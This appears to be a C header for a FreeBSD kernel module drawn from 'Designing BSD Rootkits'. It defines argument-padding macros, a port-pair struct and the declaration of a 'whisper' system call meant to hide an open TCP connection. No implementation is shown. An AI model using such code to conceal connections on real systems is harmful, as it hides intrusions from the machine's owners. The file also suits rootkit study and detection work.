#ifndef _WHISPER_H_
#define _WHISPER_H_

/**
 * From "Designing BSD Rootkits" by Joseph Kong:
 * The kernel expects each system call argument to be of size register_t
 * which is an int on i386, but is typically a long on other platforms)
 * and that it builds an array of register_t values that
 * are then cast to void * and passed as the arguments.
 * For this reason, you might need to include explicit padding in your
 * arguments’ structure to make it work correctly if it has any types
 * that aren’t of size register_t (e.g., char , or
 * int on a 64-bit platform).
 * The <sys/sysproto.h> header provides some macros to do this,
 * along with examples.
 */

#define PAD_(t) (sizeof(register_t) <= sizeof(t) ? \
                0 : sizeof(register_t) - sizeof(t))

#if BYTE_ORDER == LITTLE_ENDIAN
#define PADL_(t)        0
#define PADR_(t)        PAD_(t)
#else
#define PADL_(t)        PAD_(t)
#define PADR_(t)        0
#endif

struct whisper_args {
   char lport_l_[PADL_(int)];
   int lport; // local port
   char lport_r_[PADR_(int)];

   char fport_l_[PADL_(int)];
   int fport; // foreign port
   char fport_r_[PADR_(int)];
};

/* System call to hide an open TCP connection. */
static int
whisper(struct thread *td, void *syscall_args);
#endif
